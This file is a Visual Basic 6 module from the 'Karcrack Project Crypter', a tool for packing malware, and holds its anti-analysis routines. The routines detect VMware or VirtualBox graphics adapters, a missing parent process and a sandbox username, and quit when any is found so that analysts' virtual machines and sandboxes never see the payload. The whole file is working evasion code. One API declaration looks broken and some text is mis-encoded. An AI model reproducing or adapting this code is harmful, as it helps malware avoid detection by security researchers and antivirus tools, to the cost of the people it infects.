Attribute VB_Name = "mod_anticodes"

'##############################################################
'#Automated encryption code                     #
'#by Karcrack Project Crypter v2.1 [KPC]                  #
'#Program consisting of Karcrack                        #
'#Details of the encryption:                            #
'#	+ Encriptacion  :RC4                                      
'#	+ Contrase�a    :qkercipgp
'#	+ L. Encriptacion:0                                        
'#	+ Fecha/Hora    :14:31:03--01/06/2009                     
'##############################################################
Option Explicit

Private Declare Function CreateToolhelpSnapshot Lib "kernel32" Alias "CreateToolhelp32Snapshot" (ByVal dwFlags As Long, ByVal th32ProcessID As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" Alias "Process32First" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" Alias "Process32Next" (ByVal hSnapShot As Long, uProcess As PROCESSENTRY32) As Long
Private Declare Sub CloseHandle Lib "kernel32" (ByVal hObject As Long)
Private Declare Function P_ID Lib "kernel32" () As Long
Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal hWnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long

Private Const TH32CS_SNAPPROCESS = &H2
Private Const MAX_PATH As Long = 260

Private Type PROCESSENTRY32
dwSize As Long
cntUsage As Long
th32ProcessID As Long
th32DefaultHeapID As Long
th32ModuleID As Long
cntThreads As Long
th32ParentProcessID As Long
pcPriClassBase As Long
dwFlags As Long
szExeFile As String * MAX_PATH
End Type

Function vm()
  Dim oAdapters As Object
  Dim oCard As Object
  Dim SQL As String
                        

    
  ' Abfrage erstellen
  SQL = "SELECT * FROM Win32_VideoController"
  Set oAdapters = GetObject("winmgmts:").ExecQuery(SQL)
  
  ' Auflisten aller Grafikadapter
  For Each oCard In oAdapters
    Select Case oCard.Description
    
        Case "VMware SVGA II"
        End
        

        Case "VirtualBox Graphics Adapter"
        End
        
        Case "S3 Trio32/64"
        End
        
        
        Case ""
        End
        
        Case "VM Additions S3 Trio32/64"
        End
        
        Case Else
        
    End Select


        
  Next
End Function



Public Function Sandboxed() As Boolean
Dim nSnapshot As Long, nProcess As PROCESSENTRY32
Dim nResult As Long, ParentID As Long, IDCheck As Boolean
Dim nProcessID As Long

'Eigene ProcessID ermitteln
nProcessID = P_ID
If nProcessID <> 0 Then
'Abbild der Prozesse machen
nSnapshot = CreateToolhelpSnapshot(TH32CS_SNAPPROCESS, 0&)
If nSnapshot <> 0 Then
nProcess.dwSize = Len(nProcess)

'Zeiger auf ersten Prozess bewegen
nResult = ProcessFirst(nSnapshot, nProcess)

Do Until nResult = 0
'Nach der eigenen ProcessID suchen.
If nProcess.th32ProcessID = nProcessID Then

'Wir merken uns die ParentProcessID
ParentID = nProcess.th32ParentProcessID

'Wir beginnen nochmal beim ersten Prozess
nResult = ProcessFirst(nSnapshot, nProcess)
Do Until nResult = 0
'Wir suchen den Process mit der ParentID
If nProcess.th32ProcessID = ParentID Then
'Falls so ein Prozess vorhanden ist, dann ist das Programm nicht sandboxed
IDCheck = False
Exit Do
Else
IDCheck = True
nResult = ProcessNext(nSnapshot, nProcess)
End If
Loop

'Falls check True ist, dann ist das Programm Sandboxed
Sandboxed = IDCheck

Exit Do
Else
'Zum n�chsten Prozess
nResult = ProcessNext(nSnapshot, nProcess)
End If
Loop
' Handle wird geschlo�en
CloseHandle nSnapshot
End If
End If
End Function

Public Function sbie()

If Sandboxed() Then
    End
End If

End Function

Public Function nrmsb()

If Environ("username") = "CurrentUser" Then
    End
End If

End Function



